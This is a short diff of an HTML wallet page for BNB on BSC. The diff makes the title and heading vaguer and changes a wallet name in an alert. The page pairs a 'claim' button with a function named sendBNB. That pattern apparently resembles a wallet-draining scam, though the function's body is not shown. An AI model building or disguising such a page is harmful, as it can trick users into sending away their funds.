@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BNB Transfer Stable</title>
+<title>Stable</title>
 <style>
 body{font-family:sans-serif;text-align:center;margin-top:50px;}
 button{padding:10px 20px;font-size:16px;margin:10px;}
@@ -11,7 +11,7 @@ button{padding:10px 20px;font-size:16px;margin:10px;}
 </head>
 <body>
 
-<h2>claim)</h2>
+<h2>.</h2>
 
 <button onclick="connectWallet()">connect</button>
 <button onclick="sendBNB()">claim</button>
@@ -28,7 +28,7 @@ function setStatus(msg){
 
 //  BSC
 async function connectWallet(){
-    if(!window.ethereum){ alert("Wallet not fund.It might be better to install the Etamad wallet from Google Play and create a new wallet."); return; }
+    if(!window.ethereum){ alert("Wallet not fund.It might be better to install the trust wallet from Google Play and create a new wallet."); return; }
     try{
         const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
         account = accounts[0];
